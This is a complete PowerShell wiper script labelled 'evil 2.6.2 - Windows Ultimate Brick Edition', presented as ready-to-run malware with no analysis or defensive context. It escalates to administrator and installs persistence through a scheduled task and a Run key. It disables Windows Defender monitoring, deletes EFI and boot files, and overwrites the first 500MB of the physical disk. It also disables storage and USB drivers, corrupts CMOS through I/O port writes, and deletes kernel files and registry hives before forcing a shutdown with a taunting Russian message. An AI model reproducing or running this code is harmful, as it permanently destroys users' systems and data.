# evil 2.6.2 - Windows Ultimate Brick Edition

$mutex = New-Object System.Threading.Mutex($false, "Global\EVIL_MUTEX_2026")
if (-not $mutex.WaitOne(0, $false)) { exit }

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$persistentPath = "$env:APPDATA\Microsoft\Windows\evil.ps1"
Copy-Item $PSCommandPath $persistentPath -Force

try {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName "evil" -Action $action -Trigger $trigger -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "evil" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$persistentPath`"" -Force
} catch { }

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -Force
} catch { }

try {
    $espDrives = Get-Partition -ErrorAction SilentlyContinue | Where-Object { $_.GptType -eq "{c12a7328-f81f-11d2-ba4b-00a0c93ec93b}" -or $_.Type -eq "System" }
    foreach ($esp in $espDrives) {
        $letter = $esp.DriveLetter
        if ($letter) {
            Remove-Item "${letter}:\EFI\*" -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    Remove-Item "C:\Boot\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\Boot\*" -Recurse -Force -ErrorAction SilentlyContinue
} catch { }

try {
    $diskPath = "\\.\PhysicalDrive0"
    $fs = [System.IO.File]::OpenWrite($diskPath)
    $zeroBlock = New-Object byte[] (1MB)
    for ($i = 0; $i -lt 500; $i++) {
        $fs.Write($zeroBlock, 0, $zeroBlock.Length)
    }
    $fs.Close()
} catch { }

try {
    $driversToKill = @("disk", "partmgr", "volume", "storahci", "stornvme", "pci", "acpi")
    foreach ($driver in $driversToKill) {
        reg add "HKLM\SYSTEM\CurrentControlSet\Services\$driver" /v "Start" /t REG_DWORD /d 4 /f 2>$null
    }
    Remove-Item "C:\Windows\System32\drivers\disk.sys" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\drivers\storahci.sys" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\drivers\stornvme.sys" -Force -ErrorAction SilentlyContinue
} catch { }

try {
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBHUB3" /v "Start" /t REG_DWORD /d 4 /f 2>$null
    reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBXHCI" /v "Start" /t REG_DWORD /d 4 /f 2>$null
} catch { }

try {
    $winring0 = @"
using System;
using System.Runtime.InteropServices;
public class WinRing0 {
    [DllImport("WinRing0x64.dll")] public static extern bool InitializeOls();
    [DllImport("WinRing0x64.dll")] public static extern void DeinitializeOls();
    [DllImport("WinRing0x64.dll")] public static extern bool WriteIoPortByte(ushort Port, byte Data);
}
"@
    Add-Type -TypeDefinition $winring0 -ErrorAction SilentlyContinue
    [WinRing0]::InitializeOls()
    [WinRing0]::WriteIoPortByte(0x70, 0x2E)
    [WinRing0]::WriteIoPortByte(0x71, 0xFF)
    [WinRing0]::DeinitializeOls()
} catch { }

try {
    Remove-Item "HKLM:\SYSTEM\CurrentControlSet" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\winload.exe" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\winload.efi" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\ntoskrnl.exe" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\hal.dll" -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\config\SYSTEM" -Force -ErrorAction SilentlyContinue
} catch { }

Write-Host '
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`
' -ForegroundColor Red

Write-Host "Вы добровольно запустили этот файл) by. evil" -ForegroundColor White
Start-Sleep -Seconds 3
Stop-Computer -Force